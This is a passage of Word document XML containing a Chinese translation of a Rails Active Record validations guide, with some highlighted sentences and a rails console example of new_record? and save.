        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId197" w:anchor="19" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>事务回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3DEDEECE"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1 对象的生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEF391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Rails 应用中常用的操作包括对象的创建，更新和销毁。Active Record 提供了方法让你关联到这些</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象生命周期</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，让你可以更好地控制应用和数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536E028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校验让你确保只有有效数据被储存到数据库中去。回调和观察者允许你在对象状态发生变化前后来触发特定代码逻辑。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E646A95"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2 校验的概述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D59B909"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在你接触到 Rails 中验证的过多细节之前，应该在整体上对验证有个了解。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661C5F1D"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2.1 为什么需要校验？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6979DB5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校验用来确保只有有效的数据可以被保存到数据库。例如，确保用户提供的电子邮件和住址的有效性对于你的应用来讲可能是非常重要的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E153F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有很多方法用来在数据存入数据库之前进行校验，包括数据库约束，客户端校验，控制器级别的校验以及模型级别的校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195F8BD1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC3A69">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>数据库约束和/或存储过程的验证机制依赖于特定的数据库， 这导致测试和维护比较困难</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。但是，</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3A69">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>如果你的数据库需要提供给第三方应用，那么必要的数据库约束将是很好的策略</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。另外，</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3A69">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>数据库级别验证能够安全地处理一些其 他验证方法很难实现的情况</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(如在重负荷数据表中的唯一性约束)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01839D49" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>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客户段校验很有用，但是如果单独使用，通常来讲不是很可靠。如果是通过 JavaScript 来实现的校验，当用户在浏览器中关闭 Javascript，校验就很容易被绕过。虽然如此，但如果在你的网站中结合其他的校验技术共同使用的话，客户端校验将会非常方便，因为它可以立刻给用 户反馈校验结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3135A128" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>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控制器级别的校验用起来很方便直观，但是通常会使控制器变得笨重以至于难以测试和维护。所以无论何时， </w:t>
      </w:r>
      <w:hyperlink r:id="rId198" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>keep your controllers skinny</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 都将是个好主意，他将让你的应用适合长期运行和维护。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717458BE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC3A69">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>模型级别的校验最适合用来在保存到数据库前来验证数据的有效性</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。它不依赖于特定数据库，也不能被客户端绕过，并且方便测试和维护。而且 Rails 让校验变的很容易，因为它提供了内建helpers供常用的校验使用，并同时允许你创建自己的校验方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177D54DE"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2.2 校验发生在什么时候？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2D90C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Active Record 对象有两种：一种表示已经存入到数据库表中的一行，另一种则还没有存入到数据库。当你新创建一个对象时，如使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，这时这个对象还不属于数据库。一旦你在这个对象上调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>save</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，它将被保存到指定的数据库表中。</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">Active Record 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>new_record?</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个实例方法来判断对象是否已经存入数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。考虑下面这个简单的 Active Record 类：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="72B02043" w14:textId="77777777" w:rsidTr="003112D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7519059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5BF8CBD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9D29689"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我们可一通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的输出来查看它是如何工作的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3B852FD1" w14:textId="77777777" w:rsidTr="003112D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4EE5EAB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p = Person.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6569A23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#&lt;Person id: nil, name: "John Doe", created_at: nil, :updated_at: nil&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2080822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p.new_record?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0ED7A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true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D7423A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p.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B8936A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true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A02953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xml:space="preserve">&gt;&gt; </w:t>
            </w:r>
            <w:r w:rsidRPr="00197F86">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>p.new_record?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60230BB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false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F88319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创建和保存一个新对象将会在数据库中执行 SQL </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令。而更新一个已经存在的记录将会在数据库中执行 SQL </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>UPDATE</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令。</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">校验通常在这些 SQL 命令执行前运行。如过有任何的校验失败，对象将被标记为无效，这样 Active Record 将不会执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>UPDATE</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 操作</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这将帮助我们避免将无效数据保存到数据库中。你也可以选择在创建，保存或者更新时执行特定的校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E2CDA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Rails 中有很多方法可以修改已经保存到数据库中的对象。其中</w:t>
      </w:r>
      <w:r w:rsidRPr="003112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>一些方法会触发校验，另一些方法并不会</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这意味着如果我们不注意，仍然有可能将一个无效的对象保存到数据库中去的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F7BC2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3112D8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>下列方法将会触发校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，并仅当对象通过校验后才会保存到数据库中：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFA317B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78492B8C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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create</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A18A168" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF4DCE4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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save</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CABC99" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB1DBAD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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update_attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B454820" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BECCA0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87DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">带有感叹号的方法(如 </w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>save!</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>)将会在对象未通过校验时抛出异常</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。不带感叹号的则不会：如 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>save</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，而 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将仅仅返回对象。</w:t>
      </w:r>
    </w:p>
